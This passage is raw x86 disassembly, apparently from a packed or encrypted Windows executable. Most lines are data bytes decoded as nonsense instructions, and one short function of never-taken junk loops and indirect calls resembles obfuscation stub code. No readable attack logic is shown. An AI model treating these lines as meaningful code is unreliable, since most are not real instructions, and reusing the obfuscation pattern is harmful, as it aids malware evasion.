  40696f:	add    BYTE PTR [eax+0x5d794f2a],cl
  406975:	popf   
  406976:	loop   0x40698d
  406978:	pop    edi
  406979:	fisubr DWORD PTR [esp+eax*2-0x357160ad]
  406980:	jbe    0x4069c0
  406982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406983:	jae    0x406983
  406985:	mov    gs,WORD PTR [edi]
  406987:	(bad)  
  406988:	xor    esp,DWORD PTR [esi-0x28]
  40698b:	cmc    
  40698c:	pop    eax
  40698d:	ja     0x4069ac
  40698f:	jg     0x40695c
  406991:	adc    edx,ebp
  406993:	adc    DWORD PTR [ecx],edi
  406995:	mov    esp,DWORD PTR [ebp+0x3b]
  406998:	ss int3 
  40699a:	into   
  40699b:	imul   edi,DWORD PTR [ecx+0x50],0xddf38e7c
  4069a2:	ficom  DWORD PTR [eax+0x41e9f13]
  4069a8:	outs   dx,BYTE PTR ds:[esi]
  4069a9:	xor    ebx,DWORD PTR [ebx]
  4069ab:	mov    dh,0x77
  4069ad:	out    0x28,eax
  4069af:	jo     0x4069a1
  4069b1:	sub    ebx,DWORD PTR [eax+0x5d9187b3]
  4069b7:	sbb    DWORD PTR [eax+0x33e059c1],esp
  4069bd:	test   eax,0x3effa198
  4069c2:	dec    esp
  4069c3:	inc    ecx
  4069c4:	std    
  4069c5:	out    dx,eax
  4069c6:	sub    BYTE PTR [esi+ebp*4],ah
  4069c9:	add    al,BYTE PTR [ecx-0x6d]
  4069cc:	out    0xc2,al
  4069ce:	jge    0x4069fe
  4069d0:	daa    
  4069d1:	rep stos BYTE PTR es:[edi],al
  4069d3:	ins    BYTE PTR es:[edi],dx
  4069d4:	sub    eax,0xaf69df62
  4069d9:	or     al,0x18
  4069db:	pop    ds
  4069dc:	jns    0x406a27
  4069de:	fs inc eax
  4069e0:	pop    esp
  4069e1:	popa   
  4069e2:	retf   
  4069e3:	popa   
  4069e4:	and    al,0xa9
  4069e6:	pop    ecx
  4069e7:	test   al,0x27
  4069e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069ea:	outs   dx,DWORD PTR ds:[esi]
  4069eb:	retf   
  4069ec:	adc    dl,BYTE PTR [ebx-0x60988dc7]
  4069f2:	inc    ebp
  4069f3:	jb     0x406a55
  4069f5:	mov    cl,0xb
  4069f7:	test   dh,cl
  4069f9:	add    al,0x22
  4069fb:	mov    edi,0x9d596358
  406a00:	and    DWORD PTR [esi],0x37
  406a03:	mov    al,0xb6
  406a05:	cli    
  406a06:	dec    ebp
  406a07:	inc    edi
  406a08:	int    0x9
  406a0a:	inc    edi
  406a0b:	mov    ebx,DWORD PTR [edx]
  406a0d:	dec    edi
  406a0e:	sahf   
  406a0f:	fldl2t 
  406a11:	and    DWORD PTR [eax-0x6b9dfa1],edi
  406a17:	je     0x406a15
  406a19:	pop    ds
  406a1a:	aam    0x7c
  406a1c:	inc    edx
  406a1d:	int3   
  406a1e:	hlt    
  406a1f:	inc    ebx
  406a20:	repz sub DWORD PTR [ecx+0x4b],esp
  406a24:	or     BYTE PTR [ebx+0x7125b48e],ah
  406a2a:	(bad)  
  406a2b:	fwait
  406a2c:	mov    ebp,0x63e76f2a
  406a31:	retf   0x3f15
  406a34:	out    dx,eax
  406a35:	ret    0xfe8a
  406a38:	adc    al,BYTE PTR [edi-0x14cea2f7]
  406a3e:	dec    ebp
  406a3f:	and    dh,dh
  406a41:	cmp    esp,edi
  406a43:	mov    edi,0x249e4aaa
  406a48:	adc    edi,DWORD PTR [esi]
  406a4a:	idiv   dl
  406a4c:	loopne 0x406aa1
  406a4e:	and    eax,0x43bf30e8
  406a53:	sub    esp,edx
  406a55:	push   ecx
  406a56:	js     0x4069f5
  406a58:	rcl    DWORD PTR [edi-0xa91a56c],0x1c
  406a5f:	cld    
  406a60:	mov    bl,0x14
  406a62:	scas   al,BYTE PTR es:[edi]
  406a63:	lea    ebp,[ebx]
  406a65:	jae    0x406a85
  406a67:	sar    BYTE PTR [esi],0x5
  406a6a:	dec    ebx
  406a6b:	test   DWORD PTR [ebx+0x3fa723d5],ebp
  406a71:	cdq    
  406a72:	mov    al,ds:0x3cc7fe0d
  406a77:	push   esi
  406a78:	dec    esp
  406a79:	push   0x29
  406a7b:	adc    BYTE PTR [edi+0x15],ah
  406a7e:	jle    0x406aca
  406a80:	jo     0x406adf
  406a82:	retf   0x1219
  406a85:	test   eax,0x2571fd1
  406a8a:	or     DWORD PTR [esi+eiz*1+0x6f],0xffffff8b
  406a8f:	loop   0x406a25
  406a91:	xchg   ebp,eax
  406a92:	xchg   BYTE PTR ss:[edi-0x7cdf241b],dh
  406a99:	ret    
  406a9a:	outs   dx,DWORD PTR ds:[esi]
  406a9b:	fnstenv [ebp+0x3094656a]
  406aa1:	mov    ch,BYTE PTR [edx-0x45]
  406aa4:	xor    dh,0x66
  406aa7:	test   al,0x4d
  406aa9:	test   eax,0x408c6d7a
  406aae:	push   esp
  406aaf:	jmp    0x7c1b:0xec95b24b
  406ab6:	mov    dh,0xff
  406ab8:	push   0x32859406
  406abd:	dec    eax
  406abe:	mov    edx,0x5c1338c
  406ac3:	pushf  
  406ac4:	jb     0x406af8
  406ac6:	add    cl,cl
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e7fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fe01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fdd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e7ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fdd9
  406b20:	and    esi,DWORD PTR ds:0x42e228
  406b26:	mov    DWORD PTR ds:0x42fdd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e7f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e7f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e7f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e3df
  406b61:	mov    edi,DWORD PTR ds:0x42e7f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e7f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fdf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fdf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fdf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fdfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e63f
  406bad:	mov    edi,DWORD PTR ds:0x42fdf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fdf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fde5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fde5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fde5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fde5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fde5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fded
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e55b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fe76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fe76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fe76,edi
  406c22:	cmp    DWORD PTR ds:0x42fe76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e807
  406c34:	push   0x42e2a4
  406c39:	call   DWORD PTR ds:0x42e643
  406c3f:	cmp    DWORD PTR ds:0x42fe76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fe76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fe76,edi
  406c59:	cmp    DWORD PTR ds:0x42fe76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e813,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e80b,0x42fe76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x1b
  406c9b:	aam    0x55
  406c9d:	outs   dx,BYTE PTR ds:[esi]
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c80
  406ca7:	add    bl,cl
  406ca9:	int3   
  406caa:	inc    esi
  406cab:	push   0x69
  406cad:	sbb    DWORD PTR [ebx-0x768c4af2],ecx
  406cb3:	adc    DWORD PTR [ebp+0x5d38986d],esp
  406cb9:	inc    eax
  406cba:	mov    ch,0x7d
  406cbc:	jmp    0xa761:0x1b70edf8
  406cc3:	(bad)
  406cc7:	sub    BYTE PTR [ecx-0xc],ah
  406cca:	pop    es
  406ccb:	test   DWORD PTR [ebp-0x23],edx
  406cce:	or     eax,0x8160541b
  406cd3:	jns    0x406ca1
  406cd5:	dec    edx
  406cd6:	adc    bl,BYTE PTR [eax+ecx*8-0x1c77863e]
  406cdd:	aas    
  406cde:	neg    BYTE PTR [edx+0x67]
  406ce1:	not    BYTE PTR [ecx+0x53]
  406ce4:	les    ebx,FWORD PTR [eax]
  406ce6:	es out dx,eax
  406ce8:	mov    ch,cl
  406cea:	pop    edi
  406ceb:	sbb    BYTE PTR [ebx-0x3de6da39],0x26
  406cf2:	fnstenv [ebp-0x36]
  406cf5:	xlat   BYTE PTR ds:[ebx]
  406cf6:	inc    edx
  406cf7:	inc    ebx
  406cf8:	push   cs
  406cf9:	scas   eax,DWORD PTR es:[edi]
  406cfa:	pop    ebp
  406cfb:	xor    dh,dl
  406cfd:	call   0xec2c:0x2f3c655a
  406d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d05:	fisttp QWORD PTR [eax]
  406d07:	shl    BYTE PTR [ecx-0x3d],0x15
  406d0b:	add    eax,DWORD PTR [ebx-0x61]
  406d0e:	pop    eax
  406d0f:	(bad)  
  406d11:	push   edi
  406d12:	mov    BYTE PTR [edx+0x8],dh
  406d15:	push   ebx
  406d16:	(bad)
  406d1b:	and    al,0xbd
  406d1d:	jp     0x406ce7
  406d1f:	not    BYTE PTR ds:0x8ca9aed0
  406d25:	push   edx
  406d26:	inc    ecx
  406d27:	aad    0xe7
  406d29:	mov    al,0x13
  406d2b:	ficomp DWORD PTR [edi]
  406d2d:	rcl    eax,cl
  406d2f:	in     al,0xdc
  406d31:	mov    ss,WORD PTR [ebx+0x3028f39e]
  406d37:	(bad)  
  406d38:	retf   
  406d39:	cld    
  406d3a:	hlt    
  406d3b:	pop    esi
  406d3c:	or     al,0xa6
  406d3e:	dec    esp
  406d3f:	in     al,dx
  406d40:	or     eax,0xc05e6b6e
  406d45:	cmp    eax,0xdba39499
  406d4a:	xchg   esi,eax
  406d4b:	pop    ds
  406d4c:	sbb    ah,al
  406d4e:	and    DWORD PTR [ecx+ebp*8],ecx
  406d51:	jno    0x406d01
  406d53:	fld1   
  406d55:	mov    ?,WORD PTR [edi-0x3e]
  406d58:	lock lods eax,DWORD PTR ds:[esi]
  406d5a:	retf   
  406d5b:	adc    al,0x89
  406d5d:	or     DWORD PTR [edx-0x32b3b348],esp
  406d63:	(bad)  
  406d64:	jmp    0xb7069504
  406d69:	jmp    0x7138:0x67737201
  406d70:	cmp    edx,DWORD PTR [esi-0x8]
  406d73:	add    edi,edx
  406d75:	cli    
  406d76:	retf   0xd170
  406d79:	xor    al,0xeb
  406d7b:	add    DWORD PTR [ebp-0x20],edi
  406d7e:	shr    DWORD PTR [esp+eax*1+0x79],0x3e
  406d83:	lods   al,BYTE PTR ds:[esi]
  406d84:	mov    bl,0x21
  406d86:	stc    
  406d87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d88:	jle    0x406dac
  406d8a:	add    DWORD PTR [ebp+0x4f],edx
  406d8d:	pushf  
  406d8e:	fwait
  406d8f:	cmp    eax,0x8b3e6973
  406d94:	inc    esp
  406d95:	lods   al,BYTE PTR ds:[esi]
  406d96:	push   edi
  406d97:	and    al,BYTE PTR [ecx]
  406d99:	mov    ebx,es
  406d9b:	sub    BYTE PTR [esi-0x32],0xac
  406d9f:	fdivr  DWORD PTR [ebp-0x1dc0725b]
  406da5:	push   es
  406da6:	mov    eax,ds:0xeb7af6d9
  406dab:	(bad)  
  406dac:	fimul  WORD PTR [ebx+0x2b4cf952]
  406db2:	int3   
  406db3:	push   ss
  406db4:	ss ds dec ebx
  406db7:	push   0xffffffc9
  406db9:	and    cl,BYTE PTR [edi+eax*2+0x49370fd1]
  406dc0:	adc    ch,dh
  406dc2:	lods   al,BYTE PTR ds:[esi]
  406dc3:	test   DWORD PTR [ebx+edi*4+0x26],0x990a4ac9
  406dcb:	jge    0x406e32
  406dcd:	or     cl,BYTE PTR [ecx]
  406dcf:	retf   
  406dd0:	aad    0xc6
  406dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dd3:	pop    ds
  406dd4:	daa    
  406dd5:	mov    ecx,DWORD PTR ds:0x27c93322
  406ddb:	mov    esp,0xfaf10519
  406de0:	gs mov ecx,0x41c07297
  406de6:	dec    esi
  406de7:	dec    eax
  406de8:	pop    ss
  406de9:	xchg   ebp,eax
  406dea:	xchg   edx,eax
  406deb:	inc    eax
  406dec:	cmc    
  406ded:	mov    dl,0x76
  406def:	mov    eax,0x3fb2f5f3
  406df4:	je     0x406dc3
  406df6:	stc    
  406df7:	jp     0x406da8
  406df9:	sbb    ah,0x84
  406dfc:	xchg   edx,eax
  406dfd:	daa    
  406dfe:	je     0x406e1e
  406e00:	pop    ds
  406e01:	and    ebx,esi
  406e03:	jnp    0x406dbc
  406e05:	xor    dh,ah
  406e07:	ret    
  406e08:	lahf   
  406e09:	mov    edx,0x60e6b111
  406e0e:	adc    ch,dh
  406e10:	call   0x628d306e
  406e15:	stc    
  406e16:	rol    cl,1
  406e18:	cmp    al,0x99
  406e1a:	cwde   
  406e1b:	add    ecx,DWORD PTR [edi]
  406e1d:	(bad)
  406e20:	jae    0x406e90
  406e22:	pop    esi
  406e23:	push   ecx
  406e24:	push   edx
  406e25:	addr16 retf 0x388b
  406e29:	add    DWORD PTR [edi],ebp
  406e2b:	fstp   QWORD PTR gs:[esi-0x76]
  406e2f:	jnp    0x406e8c
  406e31:	mov    dl,0x36
  406e33:	jne    0x406e22
  406e35:	mov    ch,0x32
  406e37:	aaa    
  406e38:	cmp    DWORD PTR [ecx-0x671a228],ecx
  406e3e:	dec    esp
  406e3f:	or     eax,0x797fd05
  406e44:	daa    
  406e45:	pcmpgtw mm4,QWORD PTR [ebx+0x2feee773]
  406e4c:	or     bh,ah
  406e4e:	sub    al,0xb1
  406e50:	in     eax,0x40
  406e52:	jmp    0x406dd7
  406e54:	icebp  
  406e55:	mov    cs,WORD PTR [ebx]
  406e57:	mov    eax,0x203cc1be
  406e5c:	rcr    esp,1
  406e5e:	int3   
  406e5f:	or     eax,0xa10ef4af
  406e64:	hlt    
  406e65:	inc    ecx
  406e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e67:	(bad)  
  406e68:	sbb    al,BYTE PTR [edi-0x76]
  406e6b:	adc    al,BYTE PTR [eax-0x77079ec]
  406e71:	daa    
  406e72:	mov    eax,ds:0x97062cf5
  406e77:	inc    eax
  406e78:	cmp    DWORD PTR [edi-0x4f70e29b],esp
  406e7e:	xor    esp,DWORD PTR [ebp+0x48]
  406e81:	jge    0x406e42
  406e83:	mov    ds:0x619d37ac,al
  406e88:	aas    
  406e89:	ds jnp 0x406e78
  406e8c:	xor    DWORD PTR ds:0xb8a5c9b7,ecx
  406e92:	call   0x46d1:0x278698f7
  406e99:	adc    eax,0x2df04437
  406e9e:	xchg   ebp,eax
  406e9f:	xlat   BYTE PTR ds:[ebx]
  406ea0:	dec    esi
  406ea1:	ficom  DWORD PTR [esp+edi*1+0x50c95fbc]
  406ea8:	call   0x62cf:0x96d17902
  406eaf:	jbe    0x406edc
  406eb1:	imul   ebp,DWORD PTR [esi-0x62],0xb2df91c2
  406eb8:	xor    esi,DWORD PTR [eax-0x764e32da]
  406ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ebf:	daa    
  406ec0:	xor    eax,0xd0af9991
  406ec5:	lods   al,BYTE PTR ds:[esi]
  406ec6:	fnsave [edi+ebp*1]
  406ec9:	lahf   
  406eca:	mov    ebx,0x4de97e30
  406ecf:	fdivr  QWORD PTR [ebp-0x21]
  406ed2:	call   DWORD PTR [ecx+eax*8+0xa]
  406ed6:	push   ecx
  406ed7:	lea    ebx,[edx+0x29]
  406eda:	sub    BYTE PTR [eax-0x2ea06d55],dh
  406ee0:	mov    edi,es
  406ee2:	push   cs
  406ee3:	pusha  
  406ee4:	and    bh,BYTE PTR [esi-0x21]
  406ee7:	inc    DWORD PTR [esi+0x71]
  406eea:	clc    
  406eeb:	jmp    FWORD PTR [ecx+0x3272de23]
  406ef1:	mov    edi,DWORD PTR [eax+ebp*1-0x22f6dcad]
  406ef8:	or     bh,cl
  406efa:	pop    ecx
  406efb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406efd:	hlt    
  406efe:	pop    edi
  406eff:	shl    DWORD PTR [edi+0x1a],cl
  406f02:	sti    
  406f03:	xor    DWORD PTR [edi+0x7b44733f],0xffffffe0
  406f0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f0b:	out    0xa8,al
  406f0d:	(bad)  
  406f0e:	stos   BYTE PTR es:[edi],al
  406f0f:	jmp    0x406ede
  406f11:	pop    es
  406f12:	inc    edx
  406f13:	xchg   esp,eax
  406f14:	fstp   DWORD PTR [edx]
  406f16:	dec    eax
  406f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f18:	sbb    BYTE PTR [ecx+0x17],bl
  406f1b:	dec    esp
  406f1c:	mov    edx,0x483b6e18
  406f21:	xchg   BYTE PTR [ebp-0x7531bf95],al
  406f27:	push   edx
  406f28:	and    eax,0x340d19d3
  406f2d:	xchg   ebp,eax
  406f2e:	cli    
  406f2f:	dec    eax
  406f30:	xchg   edi,eax
  406f31:	sub    ah,BYTE PTR [ebx+eax*8-0x31]
  406f35:	jbe    0x406f17
  406f37:	sbb    DWORD PTR [edi],0xd1608d61
  406f3d:	xlat   BYTE PTR ds:[ebx]
  406f3e:	fnstenv ds:[ebp+0xf]
  406f42:	push   esi
  406f43:	adc    BYTE PTR [ecx+esi*4-0x3d],ah
  406f47:	xor    bl,BYTE PTR [ebp+0x26de3fd9]
  406f4d:	sbb    al,0x4a
  406f4f:	shr    ecx,cl
  406f51:	sar    DWORD PTR [eax],0xaa
  406f54:	cmp    bl,BYTE PTR [ebx-0x7638f24e]
  406f5a:	inc    esi
  406f5b:	das    
  406f5c:	popf   
  406f5d:	cld    
  406f5e:	lods   eax,DWORD PTR ds:[esi]
  406f5f:	pop    ebx
  406f60:	ss jb  0x406f41
  406f63:	jg     0x406f86
  406f65:	dec    edx
  406f66:	sub    DWORD PTR [edx+0x32103496],esp
  406f6c:	xchg   DWORD PTR [edi+0x109799bd],esi
  406f72:	mov    bh,bl
  406f74:	ror    BYTE PTR [edi],cl
  406f76:	cmp    bl,BYTE PTR [edx+0x5d1c35c8]
  406f7c:	je     0x406fca
  406f7e:	aad    0xc
  406f80:	lods   eax,DWORD PTR ds:[esi]
  406f81:	push   esi
  406f82:	outs   dx,DWORD PTR ds:[esi]
  406f83:	mov    ch,ch
  406f85:	mov    ds:0x9b116171,eax
  406f8a:	leave  
  406f8b:	mov    ebx,0x366dca15
  406f90:	lods   al,BYTE PTR ds:[esi]
  406f91:	adc    al,0x72
  406f93:	test   DWORD PTR [edi+ecx*4],eax
  406f96:	xor    BYTE PTR [edi+0x2a133666],cl
  406f9c:	call   0x5da22f7a
  406fa1:	enter  0xcd5d,0x1d
  406fa5:	in     eax,dx
  406fa6:	int3   
  406fa7:	adc    eax,0xded3825a
  406fac:	dec    edi
  406fad:	jmp    FWORD PTR [ecx+0x702c4159]
  406fb3:	cmp    al,ch
  406fb5:	xor    al,0x2a
  406fb7:	sbb    BYTE PTR [esi-0x1f831d3c],al
  406fbd:	push   ds
  406fbe:	xor    BYTE PTR [ecx+esi*1+0x67],bl
  406fc2:	lahf   
  406fc3:	enter  0xe374,0x60
  406fc7:	in     eax,dx
  406fc8:	dec    esp
  406fc9:	rcl    DWORD PTR [eax-0x161c5fb7],cl
  406fcf:	je     0x406fb5
  406fd1:	pop    ds
  406fd2:	lods   eax,DWORD PTR ds:[esi]
  406fd3:	dec    BYTE PTR [ebp-0x33ba385c]
  406fd9:	xor    DWORD PTR ds:0x1581f89f,eax
  406fdf:	jb     0x406fdf
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx],cl
  406fe4:	call   0x4607702b
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   cx,sp
  40700c:	adc    eax,0xc2c748d3
  407011:	jo     0x407083
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x407087
  407018:	or     BYTE PTR ds:0x583c452b,0xbb
  40701f:	pop    ds
  407020:	(bad)  
  407022:	adc    DWORD PTR [edx],edi
  407024:	sub    eax,0x1992e1a6
  407029:	clc    
  40702a:	stos   BYTE PTR es:[edi],al
  40702b:	shr    BYTE PTR [edx+0x5b1fc71f],cl
  407031:	dec    esp
  407032:	stc    
  407033:	mov    esi,0xc7b79e4
  407038:	cmp    dl,BYTE PTR [ecx-0x4a93dd47]
  40703e:	shl    ch,0x62
  407041:	dec    eax
  407042:	test   DWORD PTR [eax],ecx
  407044:	test   DWORD PTR ds:[esi-0x68],edi
  407048:	pushf  
  407049:	pop    esi
  40704a:	sbb    eax,0xfb85179b
  40704f:	aas    
  407050:	and    eax,0xfb9b1780
  407055:	pop    ss
  407056:	enter  0x6c02,0x4f
  40705a:	outs   dx,DWORD PTR ds:[esi]
  40705b:	add    cl,BYTE PTR [edi+0x11]
  40705e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40705f:	cli    
  407060:	push   edi
  407061:	sbb    al,0x2c
  407063:	mov    eax,ds:0xb017b7e1
  407068:	inc    ebp
  407069:	outs   dx,BYTE PTR ds:[esi]
  40706a:	into   
  40706b:	mov    edx,0xa6ce989a
  407070:	jmp    0xb5ab:0x5c62ecc8
  407077:	hlt    
  407078:	stc    
  407079:	inc    edx
  40707a:	push   edx
  40707b:	je     0x7a1c6851
  407081:	enter  0xb387,0xec
  407085:	into   
  407086:	push   esp
  407087:	xchg   ebp,eax
  407088:	in     eax,dx
  407089:	and    al,0x8c
  40708b:	dec    esi
  40708c:	fadd   DWORD PTR [eax+0x3fd641be]
  407092:	jmp    0x54fe:0xa5743dd8
  407099:	mov    bh,0xe8
  40709b:	add    ebx,ecx
  40709d:	cmp    BYTE PTR [eax-0x42],ch
  4070a0:	in     al,dx
  4070a1:	push   edx
  4070a2:	jge    0x40702d
  4070a4:	stos   BYTE PTR es:[edi],al
  4070a5:	jo     0x40703a
  4070a7:	sub    esi,DWORD PTR [eax-0x2c]
  4070aa:	sbb    ecx,DWORD PTR [esp+esi*8-0x707f7901]
  4070b1:	pop    esi
  4070b2:	mov    ebp,ds
  4070b4:	retf   
  4070b5:	in     eax,dx
  4070b6:	leave  
  4070b7:	cmp    edi,DWORD PTR [ebp-0x16741ec4]
  4070bd:	mov    ecx,esi
  4070bf:	outs   dx,DWORD PTR ds:[esi]
  4070c0:	sbb    edi,DWORD PTR [ebp+0x3c4c9cae]
  4070c6:	iret   
  4070c7:	add    ch,bl
  4070c9:	and    al,0x10
  4070cb:	mov    dl,0xa2
  4070ce:	mov    dh,0xc6
  4070d0:	or     bl,dh
  4070d2:	lds    ecx,FWORD PTR [edx-0x4e]
  4070d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070d6:	jmp    0xe8a47c4d
  4070db:	pop    esi
  4070dc:	enter  0xbde9,0x5b
  4070e0:	cmc    
  4070e1:	ins    BYTE PTR es:[edi],dx
  4070e2:	push   edx
  4070e3:	aaa    
  4070e4:	sbb    BYTE PTR [esi+0x27],ah
  4070e7:	cmp    bl,BYTE PTR [ecx-0x35]
  4070ea:	jo     0x4070b0
  4070ec:	test   BYTE PTR [eax],ch
  4070ee:	lds    ecx,FWORD PTR [ebx]
  4070f0:	dec    edi
  4070f1:	ss ds popa 
  4070f4:	push   cs
  4070f5:	or     DWORD PTR [ebx+0x1c],esp
  4070f8:	dec    ebx
  4070f9:	stc    
  4070fa:	mov    WORD PTR [esi],ds
  4070fc:	test   DWORD PTR [esp+ebp*4-0x30],ebp
  407100:	cdq    
  407101:	rcl    bh,1
  407103:	jae    0x4070b2
  407105:	xchg   ebx,eax
  407106:	sbb    ebx,edx
  407108:	enter  0x642f,0x3d
  40710c:	arpl   ax,si
  40710e:	sbb    al,BYTE PTR [edi]
  407110:	fs pop esi
  407112:	adc    ch,BYTE PTR [edi]
  407114:	test   BYTE PTR [edi+0x4247b450],cl
  40711a:	bnd jg 0x407145
  40711d:	inc    edi
  40711e:	retf   
  40711f:	retf   0xc910
  407122:	(bad)  
  407123:	aad    0x98
  407125:	jno    0x407151
  407127:	repz xchg ebp,eax
  407129:	or     eax,0x9b1c1551
  40712e:	and    eax,0xad91c3d7
  407133:	and    edx,DWORD PTR ds:0xbb5e8b2b
  407139:	inc    ebx
  40713a:	xchg   edi,eax
  40713b:	mov    al,ds:0x94584422
  407140:	addr16 out dx,eax
  407142:	cmc    
  407143:	jl     0x4070df
  407145:	or     dh,BYTE PTR [ecx]
  407147:	xchg   edx,eax
  407148:	cwde   
  407149:	inc    DWORD PTR [eax+0x267a4556]
  40714f:	mov    cs,WORD PTR [edi+0x69]
  407152:	pusha  
  407153:	outs   dx,DWORD PTR ds:[esi]
  407154:	lahf   
  407155:	xor    al,BYTE PTR [ebx-0xa]
  407158:	test   BYTE PTR [eax],0x90
  40715b:	mov    WORD PTR [ebx-0x3f],?
  40715e:	mov    dl,0xc4
  407160:	fistp  DWORD PTR [ebx-0x4e40f7ba]
  407166:	xchg   DWORD PTR [edi+0x7e],ebx
  407169:	mov    edx,DWORD PTR [edx+edi*4-0x14]
  40716d:	mov    ebx,0x6c7c907d
  407172:	add    DWORD PTR [ecx+0x5e9367a],ebp
  407178:	and    al,0x6a
  40717a:	leave  
  40717b:	sub    al,0x33
  40717d:	cmp    DWORD PTR [ebx+edi*1+0x6008dc61],ebp
  407184:	test   DWORD PTR [edx],eax
  407186:	or     eax,0x7aec9d5e
  40718b:	iret   
  40718c:	mov    BYTE PTR [eax-0x75],0xaa
  407190:	div    DWORD PTR ds:0x6db4cbdd
  407196:	pop    ss
  407197:	jecxz  0x4071fc
  407199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40719a:	cmp    BYTE PTR [ecx+0x70],cl
  40719d:	outs   dx,BYTE PTR ds:[esi]
  40719e:	or     DWORD PTR ds:[ecx],esp
  4071a1:	mov    esp,0xdfbf46c2
  4071a6:	add    eax,0x92ea7158
  4071ab:	retf   0xcf7b
  4071ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071af:	mov    esi,0x56e2ee13
  4071b4:	sti    
  4071b5:	in     al,0xd5
  4071b7:	adc    BYTE PTR [ebx+0x18],bh
  4071ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071bb:	xchg   ebx,eax
  4071bc:	test   DWORD PTR [ecx+0x64],0x97c62f5b
  4071c3:	sbb    eax,0x563212d3
  4071c8:	mov    eax,0x6ea8a10b
  4071cd:	ins    DWORD PTR es:[edi],dx
  4071ce:	call   0x334fd0c8
  4071d3:	(bad)  
  4071d4:	std    
  4071d5:	mov    DWORD PTR [ebx],ebp
  4071d7:	mov    esi,0x56304e0d
  4071dc:	shl    DWORD PTR [eax+0x4],1
